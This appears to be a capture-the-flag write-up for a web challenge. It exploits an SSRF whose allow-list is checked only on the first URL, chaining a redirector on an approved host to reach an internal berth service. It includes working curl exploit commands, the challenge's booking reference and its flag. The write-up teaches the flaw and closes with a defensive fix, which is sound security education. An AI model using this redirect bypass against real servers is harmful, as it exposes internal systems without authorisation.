# Berth Control — Web

> Afterlight / Port operations. The berth desk imports manifests by URL. Bring the sealed
> booking reference from *Container Says This Side Up* and make a public source reveal an
> internal berth record. An operator memo taped to the desk reads: "The training redirector
> remains at `http://public.afterlight.local:8080/redirect?next=...`. Internal berth records
> must never be exposed directly."
> `http://45.77.247.35:22011`

**Flag:** `CYBLTZ2026{r3D1r3c7_ch3ck3d_0nly_0nc3}`

SSRF where the allow-list is checked on the **initial** URL but not re-checked after a redirect.
Chains off [Container Says This Side Up](container-says-this-side-up.md).

## The importer and its gate

`GET /import?src=...` fetches a URL server-side. Two guards:

1. `X-Booking-Ref` header is required — set it to the sealed ref recovered from the container
   challenge, `BK-2602-1CBE3B57FA44037077A75FEF`.
2. "Only initial URLs at `public.afterlight.local:8080` are approved."

With the header and an approved host it happily returns records:

```bash
curl -s -H 'X-Booking-Ref: BK-2602-1CBE3B57FA44037077A75FEF' \
  'http://45.77.247.35:22011/import?src=http://public.afterlight.local:8080/sample'
# -> {"berth":42,"release_record":"BR42-PUBLIC-SAMPLE","trust":"public","record_status":"training"}
```

The real record lives on an **internal** service — from the container challenge's routing hint,
`berth-api:8080`, `/berths/<n>` — which the importer will not fetch directly
(`/import?src=.../berths/42` → `upstream status 404`, and `berth-api` isn't an approved host).

## Redirect once, check zero times

The memo hands you the primitive: a "training redirector" that lives on the approved host. The
importer validates `src`'s host (`public.afterlight.local`), fetches it, and **follows the 302
without re-validating the target**:

```bash
curl -s -H 'X-Booking-Ref: BK-2602-1CBE3B57FA44037077A75FEF' -G \
  'http://45.77.247.35:22011/import' \
  --data-urlencode 'src=http://public.afterlight.local:8080/redirect?next=http://berth-api:8080/berths/42'
```
```json
{"berth":42,"release_record":"BR42-A13428DC7E9AAD8EFBFAB5D1","trust":"internal"}
```

Internal host candidates `localhost`, `127.0.0.1`, `*.afterlight.local` all return
`upstream status 400`; the service DNS name `berth-api` is the one that resolves inside the
target network.

## Claim

A release record is "claimed" to mint the flag — field name is `release_record`:

```bash
curl -s -X POST http://45.77.247.35:22011/claim -d 'release_record=BR42-A13428DC7E9AAD8EFBFAB5D1'
# -> {"flag": "CYBLTZ2026{r3D1r3c7_ch3ck3d_0nly_0nc3}"}
```

**Takeaway:** an SSRF allow-list that validates only the user-supplied URL is bypassed by any
in-scope resource that redirects out of scope. Re-apply the allow-list on **every** hop, or
disable redirect following on server-side fetches.
